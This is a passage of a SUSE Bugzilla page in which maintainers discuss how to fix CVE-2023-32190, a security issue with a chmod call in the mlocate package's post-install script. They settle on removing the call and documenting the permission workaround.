      <div class="bz_comment_head">



        <span class="bz_comment_number">
          <a 
             href="show_bug.cgi?id=1218896#c9">Comment 9</a>
        </span>

        <span class="bz_comment_user">
          <span class="vcard"><span class="fn">Jean Delvare</span>
</span>
        </span>

        <span class="bz_comment_time">
          2024-01-18 13:13:27 UTC
        </span>
      </div>



<pre class="bz_comment_text" >I thought hard about a solution to that problem that would solve it completely without creating any race condition, nor having any side effect, but couldn't find any.

My first idea was to run chmod as &quot;nobody&quot; (su nobody -c 'chmod 644 &quot;%{_localstatedir}/lib/mlocate/mlocate.db&quot;'). This fixes the security issue, but only fixes the file permissions if RUN_UPDATEDB_AS was set to &quot;nobody&quot; (which isn't the default). It's still valuable as customers changing UMASK to a more strict setting (which is what triggers <a class="bz_bug_link 
          bz_status_RESOLVED  bz_closed"
   title="RESOLVED FIXED"
   href="show_bug.cgi?id=1188933">bug #1188933</a> in the first place) are more likely to also want a more restrictive mlocate database. Still, these are separate settings, and it is perfectly valid to change one without changing the other. So I don't feel too comfortable with this approach.

I also considered triggering a database update as part of the post-install script of mlocate, as this would fix the file permissions as a side effect. However, this is a heavy I/O operation which is normally timed during the night. Running it as part of a system update may add the I/O burden at an inappropriate time. It is also questionable to perform such a costly operation only to fix the permissions of a file.

All in all I start wondering if the cure isn't worse that the problem the chmod call was trying to solve. After all, it's only addressing a transitory issue that will solve itself overnight anyway. I think I prefer consistently having to wait for the next mlocate update (something we could simply document in a TID), than introducing a race or an inconsistent behavior.

Note that most Tumbleweed users must have installed the update by now anyway, so the file permissions are already fixed on their system. So we are really only discussing SLE customers, and the ones which have reported the bug already received a PTF so the file permissions are fixed for them too.

So I take back what I wrote in <a href="show_bug.cgi?id=1218896#c3">comment #3</a>, simply removing the troublesome chmod call could be acceptable and possibly the best solution. I originally added it as the icing on the cake, in an attempt to make customer experience as smooth as possible, but if it's going to cause more trouble than is worth, we can do without.</pre>
    </div><div id="c10" class="bz_comment">

      <div class="bz_comment_head">



        <span class="bz_comment_number">
          <a 
             href="show_bug.cgi?id=1218896#c10">Comment 10</a>
        </span>

        <span class="bz_comment_user">
          <span class="vcard"><span class="fn">Peter Simons</span>
</span>
        </span>

        <span class="bz_comment_time">
          2024-01-18 15:40:27 UTC
        </span>
      </div>



<pre class="bz_comment_text" >(In reply to Jean Delvare from <a href="show_bug.cgi?id=1218896#c9">comment #9</a>)

<span class="quote">&gt; All in all I start wondering if the cure isn't worse that the problem the
&gt; chmod call was trying to solve. After all, it's only addressing a transitory
&gt; issue that will solve itself overnight anyway. [...]
&gt; 
&gt; So I take back what I wrote in <a href="show_bug.cgi?id=1218896#c3">comment #3</a>, simply removing the troublesome
&gt; chmod call could be acceptable and possibly the best solution.</span >

Yes, I agree with your sentiment. I too believe that we should fix this security issue by removing the `chmod` call. It's not perfect, but the number of users affected by the issue that this `chmod` addresses is probably small. We could also mention the permission problem (and how to remedy it) in the patchinfo of the upcoming SLE updates and in the TID we're going to publish for this CVE. I think that's a decent solution.</pre>
    </div><div id="c11" class="bz_comment">

      <div class="bz_comment_head">



        <span class="bz_comment_number">
          <a 
             href="show_bug.cgi?id=1218896#c11">Comment 11</a>
        </span>

        <span class="bz_comment_user">
          <span class="vcard"><span class="fn">Johannes Segitz</span>
</span>
        </span>

        <span class="bz_comment_time">
          2024-01-19 07:44:33 UTC
        </span>
      </div>



<pre class="bz_comment_text" >(In reply to Jean Delvare from <a href="show_bug.cgi?id=1218896#c8">comment #8</a>)
It doesn't solve the problem fully, but after you changed the permissions you can operate safely in the directory and not worry about the user attacking you. You then can check for symlinks and not worry about TOCTOU issues.

And yes, this might interfere with a db update, but since this only happens in cases where the update runs in parallel with a package update this would seem acceptable to me. That should be rare and cure itself upon the next db update.

If we can drop the chown call that would be the best solution from a security POV. No chmod call == no attack angled.</pre>
    </div><div id="c12" class="bz_comment">

      <div class="bz_comment_head">



        <span class="bz_comment_number">
          <a 
             href="show_bug.cgi?id=1218896#c12">Comment 12</a>
        </span>

        <span class="bz_comment_user">
          <span class="vcard"><span class="fn">Jean Delvare</span>
</span>
        </span>

        <span class="bz_comment_time">
          2024-01-19 09:43:13 UTC
        </span>
      </div>



<pre class="bz_comment_text" >(In reply to Jean Delvare from <a href="show_bug.cgi?id=1218896#c9">comment #9</a>)
<span class="quote">&gt; but only fixes the file permissions if RUN_UPDATEDB_AS was set to &quot;nobody&quot;
&gt; (which isn't the default).</span >

For correctness, I must amend this claim of mine. On my laptop, RUN_UPDATEDB_AS is an empty string, and as I don't remember ever touching /etc/sysconfig/locate, I assumed this was the default. However, the current content of /usr/share/fillup-templates/sysconfig.locate sets RUN_UPDATEDB_AS to &quot;nobody&quot; by default, so this would be the default now for a fresh system installation.</pre>
    </div><div id="c18" class="bz_comment">

      <div class="bz_comment_head">



        <span class="bz_comment_number">
          <a 
             href="show_bug.cgi?id=1218896#c18">Comment 18</a>
        </span>

        <span class="bz_comment_user">
          <span class="vcard"><span class="fn">Andrea Mattiazzo</span>
</span>
        </span>

        <span class="bz_comment_time">
          2024-05-17 09:03:56 UTC
        </span>
      </div>



<pre class="bz_comment_text" >All done, closing.</pre>
    </div>


  

</td>
<td>
</td>
</tr></table>
  </div>
        

</form>

<hr>
<ul class="related_actions">
    <li><a href="show_bug.cgi?format=multiple&amp;id=1218896">Format For Printing</a></li>
    <li>&nbsp;-&nbsp;<a href="show_bug.cgi?ctype=xml&amp;id=1218896">XML</a></li>
    <li>&nbsp;-&nbsp;<a href="enter_bug.cgi?cloned_bug_id=1218896">Clone This Bug</a></li>
    
    <li>&nbsp;-&nbsp;<a href="#">Top of page </a></li>
    </ul>

<br>
</div>

    <div id="footer">
      <div class="intro"></div>
<ul id="useful-links">
  <li id="links-actions"><ul class="links">
  <li><a href="./">Home</a></li>
  <li><span class="separator">| </span><a href="enter_bug.cgi">New</a></li>
  <li><span class="separator">| </span><a href="describecomponents.cgi">Browse</a></li>
  <li><span class="separator">| </span><a href="query.cgi">Search</a></li>

  <li class="form">
    <span class="separator">| </span>
    <form action="buglist.cgi" method="get"
        onsubmit="if (this.quicksearch.value == '')
                  { alert('Please enter one or more search terms first.');
                    return false; } return true;">
    <input type="hidden" id="no_redirect_bottom" name="no_redirect" value="0">
    <script type="text/javascript">
      if (history && history.replaceState) {
        var no_redirect = document.getElementById("no_redirect_bottom");
        no_redirect.value = 1;
      }
    </script>
    <input class="txt" type="text" id="quicksearch_bottom" name="quicksearch" 
           title="Quick Search" value="">
    <input class="btn" type="submit" value="Search" 
           id="find_bottom"></form>
  <a href="page.cgi?id=quicksearch.html" title="Quicksearch Help">[?]</a></li>

  <li><span class="separator">| </span><a href="report.cgi">Reports</a></li>

  <li>
      <span class="separator">| </span>
        <a href="request.cgi">Requests</a></li>

  
    

    <li id="mini_login_containerIDP">
  <span class="separator">| </span>
  <a id="login_linkIDP" href="/saml2_login.cgi?idp=IDP&amp;target=show_bug.cgi%3Fid%3DCVE-2023-32190">IDP Log In</a>
</li>




  <li id="forgot_container_bottom">
    <span class="separator">| </span>
     <a id="forgot_link_bottom" href="https://idp-portal.suse.com/univention/self-service/#page=passwordreset">Forgot Password</a>
  </li>
</ul>
  </li>

  




  <ul class="links">
    <li>Legal: </li>
    <li><a href="http://en.opensuse.org/Terms_of_site">openSUSE</a></li>
    <li><a href="https://www.suse.com/company/legal/">SUSE</a></li>
  </ul>
</ul>

      <div class="outro"></div>
    </div>

  </body>
</html>